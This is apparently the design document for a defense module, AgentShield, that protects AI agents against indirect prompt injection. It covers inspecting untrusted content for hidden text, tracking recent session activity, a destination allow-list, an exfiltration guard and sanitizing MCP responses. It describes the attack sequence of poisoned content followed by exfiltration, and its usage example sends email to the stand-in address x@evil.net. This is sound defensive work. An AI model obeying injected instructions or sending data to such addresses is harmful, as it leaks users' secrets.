# Agent-side defense against indirect prompt injection

This document summarizes the indirect-injection defense added to AgentShield,
how it is configured, and its limits. It **extends** the existing architecture
(the policy engine, provenance model, detectors, audit log) — no rewrites.

## Where it plugs into the existing architecture

AgentShield already had the interception points this defense needs:

- **Agent / tool-execution points:** the in-process PEP (`agentshield/enforce.py`
  `guard()`), the MCP middleware (`agentshield/gateway/mcp_gateway.py`), and the
  HTTP gateway (`agentshield/gateway/app.py`). Enforcement happens **in code,
  before the tool runs** — a system prompt is never relied on.
- **Policy gate + reasons + audit:** `agentshield/policy/engine.py`,
  `agentshield/audit/`. Every decision already carries inspectable reasons and
  is logged with secrets redacted.
- **Provenance:** `agentshield/provenance.py`, `TrustLevel` in `models.py`.

Three capabilities were added on top:

### 1. Ingestion inspection (`agentshield/ingestion.py`)
The chokepoint where untrusted content is inspected **before it enters the agent
context**. `AgentShield.ingest(raw, Provenance(...), content_type=...)`:

- **Preserves source + trust metadata.** `Provenance(channel, origin, trust)` —
  emails, messages, documents, web content and MCP tool responses default to
  `UNTRUSTED`; the trust can be set explicitly.
- **Surfaces hidden / obfuscated text** in HTML: CSS-hidden spans
  (`display:none`, `visibility:hidden`, `opacity:0`, `font-size:0`, off-screen,
  white-on-white), `hidden`/`aria-hidden`/`type=hidden`, `<script>`/`<style>`
  bodies, HTML comments, **zero-width characters**, and **base64 blobs**.
- **Separates quoted content** (email replies/forwards) and marks it.
- **Scans everything** (visible + hidden + decoded) with the same detectors used
  at the gate, and returns a risk score + signals.
- Gives the agent `ingested.agent_text()` — visible text only, hidden material
  stripped, prefixed with a banner framing it as *data, not instructions*.

### 2. Recent-activity awareness (`agentshield/activity.py`)
`SessionContext` keeps a bounded, time-windowed memory of what just happened
(untrusted ingests, tool calls). This lets the gate see the injection
**sequence**: untrusted content in → unexpected action out.

### 3. Deterministic data-flow controls (in the policy engine)
Added to `agentshield/policy/engine.py`, combined with the existing contextual
detection (most-restrictive-wins). These do **not** rely on keywords or an LLM:

- **Destination allow-list** (`agentshield/extract.py`): structurally pulls every
  email/URL out of a tool call's arguments (all args, so a renamed field can't
  hide a sink) and checks them against `destination_allowlist`. An egress tool
  sending elsewhere is escalated (`on_untrusted_destination`).
- **Exfiltration guard:** egress to a non-allow-listed destination **while under
  untrusted influence** (untrusted provenance *or* a recent untrusted ingest in
  the session) is the exfiltration signature — blocked by `on_exfiltration_pattern`
  (DENY by default).
- **Least-privilege secret access:** a `reads_secrets` tool invoked under
  untrusted influence is guarded by `on_unneeded_secret_access`.

## Configuration (policy YAML)

```yaml
defaults:
  destination_allowlist: [ourcompany.com, ourco.com]   # domains / hosts / exact addrs
  on_untrusted_destination: require_approval
  on_exfiltration_pattern: deny
  on_unneeded_secret_access: require_approval

tools:
  send_email:
    is_egress: true          # destination-checked
    destination_args: [to]   # where the recipient lives (omit = scan all args)
  read_secret:
    reads_secrets: true      # guarded under untrusted influence
```

## Usage

```python
from agentshield.engine_factory import AgentShield
from agentshield.ingestion import Provenance, Channel
from agentshield.activity import SessionContext
from agentshield.models import ToolCall, TrustLevel

shield = AgentShield()
session = SessionContext(current_task="summarize this document")

# 1) Inspect untrusted content before the agent sees it.
ing = shield.ingest(html_bytes, Provenance(Channel.DOCUMENT, origin="report.html"),
                    content_type="html", session=session)
agent_input = ing.agent_text()            # hand THIS to the model, not the raw HTML

# 2) Enforce every side-effecting tool call in code, with activity context.
result = shield.check(ToolCall(tool_name="send_email",
                               arguments={"to": "x@evil.net"},
                               source=ing.trust), session=session)
if not result.allowed:
    ...   # blocked / held — result.reasons explains why
```

Demo: `python -m examples.injection_defense_demo`

## What each requirement maps to

| Requirement | Implementation |
|---|---|
| Treat emails/messages/docs/retrieved/MCP responses as untrusted; preserve source+trust | `ingestion.Provenance`, channel defaults |
| Inspect content before it enters the agent context | `AgentShield.ingest()` |
| Hidden/obfuscated text + quoted content in HTML | `ingestion._Inspector`, zero-width/base64, quote split |
| Policy gate immediately before side-effecting tool calls | `enforce.guard()` / MCP middleware → `PolicyEngine` |
| Assess task, provenance, tool+args, recent activity | `SessionContext` + engine steps |
| Block/approve sending sensitive data to untrusted address/URL | destination allow-list + exfiltration guard |
| Accessing secrets without need | `reads_secrets` + `secret_access_guard` |
| Deterministic controls + contextual detection (not only keywords/LLM) | `extract.py` allow-list is structural; combined with detectors |
| Enforce in code before the tool runs | PEP / middleware; not a system prompt |
| Clear reasons + audit without secrets | `PolicyReason`, redacted `AuditLog` |

## MCP extension (fully working)

MCP tool responses are untrusted content that re-enters the agent context, so
the MCP gateway middleware (`agentshield/gateway/mcp_gateway.py`) participates
in the defense end-to-end:

- **Inbound:** every `tools/call` already flows through the PolicyEngine, so the
  destination allow-list, exfiltration guard, and secret guard apply to MCP
  calls automatically (one enforcement core, three front doors).
- **Outbound (new):** after an ALLOWed call, the middleware **inspects the tool
  response** via `ingest()`. Hidden/obfuscated injected instructions (CSS-hidden,
  HTML comments, zero-width, base64) are **stripped** from both the text and the
  structured content before the client sees them, and the event is audited
  (`mcp_response_sanitized`).
- **Cross-call (new):** when the provenance tag carries a `session_id`, the
  middleware keeps a per-session `SessionContext`. A poisoned response recorded
  in a session makes a **later egress call in that same session** fail the
  exfiltration guard — the indirect-injection sequence (poisoned retrieval →
  attempted exfiltration) is blocked across MCP calls.

Enable the cross-call link by passing a session id in the tag:
`{"_agentshield": {"session_id": "<id>", "source": "user", "token": "<hmac>"}}`.
End-to-end test: `tests/test_mcp_injection_defense.py`.

Limit: a response with rich structured output is fail-safely collapsed to
sanitized text when hidden content is detected (neutralization favored over
preserving structure).

## Limits (documented honestly)

- **Provenance must be supplied by the harness**, not inferred from content —
  the host app tags each ingested item with its channel/trust (established
  outside the model). Mis-tagging trusted content as untrusted (or vice-versa)
  changes enforcement.
- **Ingestion catches common HTML hiding techniques**, not every possible
  encoding (e.g. images of text / steganography, exotic unicode homoglyphs,
  deeply nested multi-layer encodings). It raises the bar; it is not a proof.
- **The exfiltration guard depends on the destination being extractable** from
  arguments. A tool that sends data to a destination resolved server-side
  (not present in the args) needs its own `is_egress` modelling.
- **The allow-list is the strong control**; without one configured, egress
  checks fall back to the exfiltration-pattern (untrusted-influence) signal only.
- `SessionContext` is in-memory and per-process; a distributed deployment needs
  a shared store for cross-process activity.
- This is **defense in depth**: it constrains what a successful injection can
  *do*, it does not guarantee detection of the injection itself.
